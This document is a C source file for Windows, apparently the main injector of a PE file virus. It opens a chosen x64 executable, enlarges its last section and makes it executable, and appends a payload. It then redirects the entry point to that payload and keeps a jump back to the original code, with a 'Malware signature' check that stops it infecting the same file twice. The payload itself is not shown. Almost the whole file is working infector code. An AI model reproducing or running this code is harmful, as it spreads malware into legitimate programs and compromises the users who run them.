#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include "payload.h"
#include "utils.h"

EXTERN_C_START
extern CONST BYTE __payload_start;
extern CONST DWORD signature;
extern CONST VOID payload();
extern LONGLONG delta_start;
extern LONGLONG to_c_code;
extern DWORD code_size;
extern CONST BYTE __payload_end;
EXTERN_C_END

BOOL InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPayload,
                   IN CONST PCVOID pEntryPoint, IN CONST DWORD dwPayloadSize) {
    PIMAGE_NT_HEADERS64 pNtHeader;
    PIMAGE_SECTION_HEADER pSection, pLastSection;
    WORD wNbSections;
    DWORD dwFileAlignment, dwSectionAlignment, dwLastSectionPtr, dwLastSectionSize, dwPayloadPtr,
        dwOrigEntryPoint, dwNewEntryPoint, dwSignature, dwSizeAligned;
    printf("pDosHeader: %p\n", pDosHeader);

    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Invalid DOS signature\n");
        return FALSE;
    }

    pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
        pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
        pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        printf("[!] Not a PE x64 file\n");
        return FALSE;
    }

    wNbSections = pNtHeader->FileHeader.NumberOfSections;
    pSection = IMAGE_FIRST_SECTION(pNtHeader);
    dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
    dwSectionAlignment = pNtHeader->OptionalHeader.SectionAlignment;
    printf("File alignment:    %#lx (%lu)\n", dwFileAlignment, dwFileAlignment);
    printf("Section alignment: %#lx (%lu)\n", dwSectionAlignment, dwSectionAlignment);

    pLastSection = &pSection[wNbSections - 1];
    dwLastSectionPtr = pLastSection->PointerToRawData;
    dwLastSectionSize = pLastSection->SizeOfRawData;
    dwPayloadPtr = dwLastSectionPtr + dwLastSectionSize;
    dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    printf("Entry point: %#010lx\n", dwOrigEntryPoint);
    printf("Last section name: %s\n", pLastSection->Name);
    printf("Last section pointer: %#010lx\n", dwLastSectionPtr);
    printf("Old raw size:      %#lx (%lu)\n", dwLastSectionSize, dwLastSectionSize);
    printf("Old virtsize:      %#lx (%lu)\n", pLastSection->Misc.VirtualSize,
           pLastSection->Misc.VirtualSize);
    printf("Old size of code:  %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
    printf("Old size of image: %lu\n", pNtHeader->OptionalHeader.SizeOfImage);

    if (dwOrigEntryPoint >= pLastSection->VirtualAddress &&
        dwOrigEntryPoint < pLastSection->VirtualAddress + dwLastSectionSize) {
        dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwLastSectionPtr +
                                 (dwOrigEntryPoint - pLastSection->VirtualAddress) -
                                 ((PCBYTE)pEntryPoint - (PCBYTE)&signature));
        printf("\nEntry point seems suspicious (inside last section)\n");
        printf("Malware signature: %#010lx\n", dwSignature);
        if (dwSignature == signature) {
            printf("Payload already injected!\n");
            return FALSE;
        }
    }

    dwSizeAligned = ALIGN(dwPayloadSize, dwFileAlignment);
    printf("Aligned payload size: %#lx (%lu)\n", dwSizeAligned, dwSizeAligned);
    pLastSection->Misc.VirtualSize = pLastSection->SizeOfRawData + dwPayloadSize;
    pLastSection->SizeOfRawData += dwSizeAligned;
    pNtHeader->OptionalHeader.SizeOfCode += pLastSection->Characteristics & IMAGE_SCN_CNT_CODE
                                                ? dwSizeAligned
                                                : pLastSection->SizeOfRawData;
    pNtHeader->OptionalHeader.SizeOfImage =
        ALIGN(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize, dwSectionAlignment);
    pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
    pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
    printf("New raw size:      %#lx (%lu)\n", pLastSection->SizeOfRawData,
           pLastSection->SizeOfRawData);
    printf("New virtsize:      %#lx (%lu)\n", pLastSection->Misc.VirtualSize,
           pLastSection->Misc.VirtualSize);
    printf("New size of code:  %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
    printf("New size of image: %lu\n", pNtHeader->OptionalHeader.SizeOfImage);

    dwNewEntryPoint = pLastSection->VirtualAddress + dwLastSectionSize +
                      (LONG)((PCBYTE)pEntryPoint - (PCBYTE)pPayload);
    pNtHeader->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
    printf("New entry point: %#010lx\n", dwNewEntryPoint);

    DWORD dwOldProtect;
    VirtualProtect(&delta_start, sizeof(delta_start), PAGE_READWRITE, &dwOldProtect);
    delta_start = (LONGLONG)dwOrigEntryPoint - (LONGLONG)dwNewEntryPoint;
    VirtualProtect(&delta_start, sizeof(delta_start), dwOldProtect, &dwOldProtect);
    printf("delta_start: %#018llx (%lld)\n", delta_start, delta_start);

    printf("New payload:\n");
    HexDump(pPayload, dwPayloadSize);

    memcpy((PBYTE)pDosHeader + dwPayloadPtr, pPayload, dwPayloadSize);

    return TRUE;
}

int main(int argc, char* argv[]) {
    int ret = 0;
    HANDLE hFile, hMapFile;
    LPVOID pMapAddress;
    DWORD dwFileSize, dwPayloadSize;
    ULARGE_INTEGER uliSize, uliOffset;
    BOOL bInjected;

    dwPayloadSize = (DWORD)((PCBYTE)&__payload_end - (PCBYTE)&__payload_start);
    printf("Payload size: %lu\n", dwPayloadSize);
    printf("Payload: %p\n", &__payload_start);
    // HexDump((PCBYTE)&__payload_start, dwPayloadSize);

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <filename.exe>\n", argv[0]);
        ret = 1;
        goto exit;
    }

    printf("Reading file: %s\n", argv[1]);

    hFile = CreateFile(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError("CreateFile");
        ret = 1;
        goto exit;
    }

    dwFileSize = GetFileSize(hFile, NULL);
    printf("File size: %lu bytes\n", dwFileSize);
    DWQUAD(uliSize) = ALIGN(dwFileSize + ALIGN(dwPayloadSize, 512), 512);

    hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, DWHILO(uliSize), NULL);
    if (hMapFile == NULL) {
        PrintError("CreateFileMapping");
        ret = 1;
        goto close_file;
    }

    DWQUAD(uliOffset) = 0;
    pMapAddress = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, DWHILO(uliOffset), 0);
    if (pMapAddress == NULL) {
        PrintError("MapViewOfFile");
        ret = 1;
        goto close_map;
    }

    DWORD dwOldProtect;
    VirtualProtect(&code_size, sizeof(code_size), PAGE_READWRITE, &dwOldProtect);
    code_size = dwPayloadSize;
    VirtualProtect(&code_size, sizeof(code_size), dwOldProtect, &dwOldProtect);

    VirtualProtect(&to_c_code, sizeof(to_c_code), PAGE_READWRITE, &dwOldProtect);
    to_c_code = (PCBYTE)&inj_code_c - (PCBYTE)&payload;
    VirtualProtect(&to_c_code, sizeof(to_c_code), dwOldProtect, &dwOldProtect);

    printf("[*] Injecting payload...\n");
    bInjected = InjectPayload((PIMAGE_DOS_HEADER)pMapAddress, (PCBYTE)&__payload_start, &payload,
                              dwPayloadSize);
    if (!bInjected) {
        ret = 1;
        printf("[!] Injection failed!\n");
        goto unmap;
    }
    printf("[*] Injection complete!\n");

    FlushViewOfFile(pMapAddress, 0);
unmap:
    UnmapViewOfFile(pMapAddress);
    FlushFileBuffers(hFile);
close_map:
    CloseHandle(hMapFile);
close_file:
    CloseHandle(hFile);
exit:
    return ret;
}
